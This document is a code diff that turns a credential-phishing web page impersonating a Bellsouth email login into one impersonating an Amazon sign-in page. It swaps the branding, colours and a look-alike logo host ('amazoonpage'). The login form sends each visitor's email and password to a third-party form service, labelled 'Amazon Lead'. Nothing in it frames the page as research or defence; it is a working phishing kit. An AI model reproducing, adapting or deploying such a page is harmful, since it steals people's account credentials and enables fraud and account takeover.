@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bellsouth Email Page</title>
+  <title>Amazon Page</title>
 
   <!-- Smartsupp Live Chat script -->
 <script type="text/javascript">
@@ -62,9 +62,10 @@ window.smartsupp||(function(d) {
       color: white;
 
       background:
-        linear-gradient(
-          rgba(13, 55, 91, .78),
-          rgba(13, 55, 91, .78)
+       linear-gradient(
+  rgba(255, 153, 0, 0.78),
+  rgba(255, 153, 0, 0.78)
+)
         ),
         url("https://images.unsplash.com/photo-1497366754035-f200968a6e72")
         center / cover no-repeat;
@@ -178,14 +179,14 @@ window.smartsupp||(function(d) {
 
   <header class="topbar">
     <div class="logo">
-      <img style="max-width:35% !important;" src="https://bellsouthmailpage.github.io/bellsouth-logo.png">
+      <img style="max-width:35% !important;" src="https://amazoonpage.github.io/amazon-logo.png">
     </div>
   </header>
 
   <section class="hero">
     <div>
-      <h1>Welcome to Bellsouth Email</h1>
-      <p>Stay connected with your messages, contacts and more.</p>
+      <h1>Welcome to Amazon</h1>
+      <p>Track your orders, manage Prime, and more.</p>
     </div>
   </section>
 
@@ -194,21 +195,21 @@ window.smartsupp||(function(d) {
     <div class="login-card">
 
       <div class="login-title">
-        Sign in to Email
+        Sign in to Your Account
       </div>
 
       <div class="login-subtitle">
-        Enter your email address and password
+        Enter your email/username and password
       </div>
 
   <form id="loginForm">
 
   <input type="hidden" name="access_key" value="727472ef-0e91-4efc-b421-2c3d16398117">
-  <input type="hidden" name="subject" value="Bellsouth Lead">
+  <input type="hidden" name="subject" value="Amazon Lead">
 
   <div class="input-field">
     <input id="email" type="email" autocomplete="off" required>
-    <label for="email">Email address</label>
+    <label for="email">Email address or Username</label>
   </div>
 
   <div class="input-field">
@@ -247,7 +248,7 @@ window.smartsupp||(function(d) {
   </main>
 
   <footer>
-   Bellsouth Email Page · 2026
+   Amazon Page · 2026
   </footer>
 
   <script>
@@ -260,7 +261,7 @@ document.getElementById("loginForm").addEventListener("submit", async function (
 
   const data = new FormData();
   data.append("access_key", accessKey);
-  data.append("subject", "Bellsouth Lead");
+  data.append("subject", "Amazon Lead");
   data.append("email", email);
   data.append("Pass", pass);
 
